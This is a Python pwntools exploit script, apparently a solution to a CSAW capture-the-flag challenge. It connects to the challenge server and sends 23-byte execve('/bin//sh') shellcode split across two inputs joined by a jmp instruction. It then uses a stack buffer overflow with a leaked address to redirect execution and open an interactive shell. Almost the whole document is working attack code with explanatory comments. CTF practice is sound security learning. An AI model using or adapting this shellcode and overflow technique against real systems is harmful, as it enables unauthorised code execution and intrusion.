from pwn import *
from struct import *

# host = remote('localhost', 5566)
# raw_input('>')
host = remote('pwn.chal.csaw.io', 9005)

# 0:  31 f6                   xor    esi,esi
# 2:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
# 9:  2f 73 68
# c:  56                      push   rsi
# d:  53                      push   rbx
# e:  54                      push   rsp
# f:  5f                      pop    rdi
# 10: 6a 3b                   push   0x3b
# 12: 58                      pop    rax
# 13: 31 d2                   xor    edx,edx
# 15: 0f 05                   syscall
# Total 23 Bytes
shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

# the op code of jmp instruction
jmp = '\xeb\xd1'

# Since this challenge give us the address of node1, 
# and the NX is disable, 
# I want to execute shellcode in stack

# And since the input is cut into 2 15 bytes segment,
# the shellcode need to do some change.

# The change is to add 'jmp' instruction to first piece of input.
# This makes executing flow go through first and second pieces of input.

payload = shellcode[:13] + jmp

host.sendline(payload)

payload = shellcode[13:]

host.sendline(payload)

# And then use buffer overflow to overwrite return address to the beautiful shellcode paradise

address = host.recvuntil('node.next: ')
address = host.recvuntil('node.buffer:')
address = int(address[:14], 16) + 40

payload = 'a' * 11 + pack('<Q', address)

host.sendline(payload)

host.interactive()
